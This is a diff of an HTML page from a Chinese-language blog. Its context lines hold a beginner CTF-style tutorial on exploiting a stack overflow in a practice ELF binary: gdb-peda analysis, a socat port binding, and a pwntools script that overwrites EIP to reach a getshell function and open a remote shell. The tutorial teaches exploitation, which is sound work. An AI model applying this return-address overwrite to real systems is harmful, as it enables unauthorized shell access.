@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html  lang="zh">
-<head>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
 <title>简单的栈溢出_hello_elf - Hvnt3r&#39;s Blog</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
@@ -100,20 +100,15 @@
             
             <div class="navbar-start">
                 
-                <a class="navbar-item"
-                href="/">主页</a>
+                <a class="navbar-item" href="/">主页</a>
                 
-                <a class="navbar-item"
-                href="/archives/">归档</a>
+                <a class="navbar-item" href="/archives/">归档</a>
                 
-                <a class="navbar-item"
-                href="/categories/">分类</a>
+                <a class="navbar-item" href="/categories/">分类</a>
                 
-                <a class="navbar-item"
-                href="/tags/">标签</a>
+                <a class="navbar-item" href="/tags/">标签</a>
                 
-                <a class="navbar-item"
-                href="/about/">关于我</a>
+                <a class="navbar-item" href="/about/">关于我</a>
                 
             </div>
             
@@ -182,17 +177,17 @@
 <h2 id="0x01-起手第一步"><a href="#0x01-起手第一步" class="headerlink" title="0x01 起手第一步"></a>0x01 起手第一步</h2><p>首先一般我拿到一个二进制文件的时候会先用<code>file</code>命令看一下文件的类型：</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">☁  1  file hello</span><br><span class="line">hello: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=547379e1b7bd695a7546d2a3321e199c0474dfa9, not stripped</span><br></pre></td></tr></table></figure>
 <p>这里显示这是一个32位的ELF文件，其实对于新手来说IDA_Pro的一键f5还是挺方便的，我们先把文件放到IDA里看一下：</p>
-<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" alt></p>
 <p>IDA的左侧显示了一些函数的信息，双击函数后再按<code>F5</code>键使IDA显示出伪C代码，这里说是伪C代码是因为这些代码严格意义上不算是C代码，只是IDA为了使程序显示更接近我们的逻辑顺序而显示的一种接近于C语言格式的代码，如果可以通过自己的判断来修复一些伪C代码中的逻辑或者变量名称，可以使得代码接近于源代码，但是我们这道题不涉及修复的知识。</p>
 <p>随便翻看一下这些函数的内容，并在脑海中大致建立一个程序的逻辑框架，看到一个read函数，不知道此函数的作用怎么办，很简单，Linux下自带命令<code>man</code>可与查看函数的手册</p>
 <p>在Linux终端下输入命令：</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man <span class="hljs-built_in">read</span></span><br></pre></td></tr></table></figure>
 <p>此时终端会打印出关于read函数的信息：</p>
-<p><img src="https://i.loli.net/2018/09/28/5bad9a4e28b52.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9a4e28b52.png" alt></p>
 <p>内容很多，感兴趣的同学可以自己敲一下试试，而我们目前只需关注一下信息：</p>
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       read - read from a file descriptor</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="hljs-keyword">ssize_t</span> read(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count);</span><br></pre></td></tr></table></figure>
 <p>我们需要看一下此函数的相关参数，<code>fd</code>我在<a href="https://hvnt3r.top/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/">之前的文章中</a>介绍过了，这个是文件描述符，不同的值代表不同的文件读写状态，0代表标准输入，后面的<code>*buf</code>代表输入的内容的指针，再后面的<code>count</code>是输入的字节数，此时看之前IDA中的伪代码就可以知道此程序会从用户的标准输入中读取64个unsigned整型并将此内容print出来，但是为什么这道题有漏洞呢，因为他读取的是64字节的内容，但是再IDA中显示内容得知程序只为V1开辟了0x16的空间，如图：</p>
-<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" alt=""> </p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" alt> </p>
 <p>这显然是会造成栈溢出的，0x16转换为十进制为22，我们可以来验证一下，我个人比较喜欢用<code>gdb</code>来调试ELF文件，其中<code>gdb</code>中有一个十分好用的插件<code>peda</code>，具体的安装方式网上也有很多的教程，在这里我也不浪费时间了，话不多说，<code>gdb</code>启动：</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">☁  1  gdb hello </span><br><span class="line">GNU gdb (Debian 8.1-4) 8.1</span><br><span class="line">......</span><br><span class="line">此处省略N个字</span><br><span class="line">......</span><br><span class="line">Reading symbols from hello...(no debugging symbols found)...<span class="hljs-keyword">done</span>.</span><br><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
 <p>先使用<code>checksec</code>来检车一下程序开启的保护措施，可以看到只开启了一个NX，这些保护措施如果不了解没关系，但是第一步<code>checksec</code>是个好习惯。</p>
@@ -222,9 +217,9 @@
 </ul>
 <p>就是说我们输入的前22个字符会正常的被程序处理，但是多出来的四个字节会覆盖在<code>EIP</code>寄存器中，如果我们把<code>EIP</code>中的内容修改为我们想执行的命令的位置，则可以执行此命令，如果我们想进一步掌控该程序需要寻找我们想执行的指令的位置。</p>
 <h2 id="0x03-寻找目标指令"><a href="#0x03-寻找目标指令" class="headerlink" title="0x03 寻找目标指令"></a>0x03 寻找目标指令</h2><p>其实找到了溢出点之后利用时有很多种方式，但是这个题目只需要我们在程序本身中寻找利用点，我们回到IDA中查看是否有可以利用的指令，然后发现了一个<code>getshell</code>函数：</p>
-<p><img src="https://i.loli.net/2018/09/28/5bade62d7af8c.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/09/28/5bade62d7af8c.png" alt></p>
 <p>此函数的地址可以在下图中找到</p>
-<p><img src="https://i.loli.net/2018/09/28/5bade68852d0e.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/09/28/5bade68852d0e.png" alt></p>
 <p>函数的地址为：<code>0804846B</code>如果我们把此<code>getshell</code>函数的入口地址放入<code>EIP</code>那么系统在执行<code>EIP</code>寄存器中的命令的时候就会直接运行<code>system(&quot;/bin/sh&quot;);</code>从而得到一个shell。</p>
 <p>为了更贴近CTF中的情景，我们可以使用<code>socat</code>把此程序的标准<code>io</code>绑定到一个端口上从而实现远程通信：</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw</span><br></pre></td></tr></table></figure>
@@ -234,7 +229,7 @@
 <p>python中有一个大名鼎鼎的库叫做<code>pwntools</code>，我们用这个工具来与远程程序进行交互与破解，此库的安装教程网上也有而且不难，这里就不多说了，漏洞利用脚本如下：</p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment">#连接目标主机，参数为IP和端口</span></span><br><span class="line">stream=remote(<span class="hljs-string">'x.x.x.x'</span>,<span class="hljs-number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#payload即攻击载荷</span></span><br><span class="line">payload=<span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-comment">#发送22个A并加上getshell函数的地址</span></span><br><span class="line">payload+=<span class="hljs-string">"A"</span>*<span class="hljs-number">22</span>+p32(<span class="hljs-number">0x0804846B</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#发送payload</span></span><br><span class="line">stream.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#打开一个shell的交互进程</span></span><br><span class="line">stream.interactive()</span><br></pre></td></tr></table></figure>
 <p>代码中p32()函数的作用是将函数地址转换为四个字节的字符串，如果不使用此函数直接发送22个A和0x0804846B则会直接发送16进制的字符而不是真正的地址的格式，运行此程序会发现程序由原来返回用户输入的名字变为了一个由交互功能的shell，可以执行用户输入的指令，到这里漏洞利用就算是成功了，当然，这个shell并不是标准的shell，可以利用python打开一个shell的完全体。</p>
-<p><img src="https://i.loli.net/2018/09/28/5badf1bbc1064.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/09/28/5badf1bbc1064.png" alt></p>
 <ul>
 <li style="list-style: none"><input type="checkbox" checked> 漏洞利用成功</li>
 </ul>
@@ -412,36 +407,31 @@
         
         <div class="level is-mobile">
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Github" href="https://github.com/Hvnt3r">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Hvnt3r">
                 
                 <i class="fab fa-github"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Facebook" href="https://facebook.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Facebook" href="https://facebook.com">
                 
                 <i class="fab fa-facebook"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Twitter" href="https://twitter.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com">
                 
                 <i class="fab fa-twitter"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Dribbble" href="https://dribbble.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Dribbble" href="https://dribbble.com">
                 
                 <i class="fab fa-dribbble"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="RSS" href="https://hvnt3r.top/atom.xml">
+            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="https://hvnt3r.top/atom.xml">
                 
                 <i class="fas fa-rss"></i>
                 
@@ -2362,8 +2352,7 @@
                 </a>
                 <p class="is-size-7">
                 &copy; 2019 Hvnt3r&nbsp;
-                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
-                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                 
                 </p>
             </div>
@@ -2499,7 +2488,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -2526,5 +2515,5 @@ document.addEventListener('DOMContentLoaded', function () {
 <link rel="stylesheet" href="/css/search.css">
 <link rel="stylesheet" href="/css/insight.css">
     
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-koharu"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
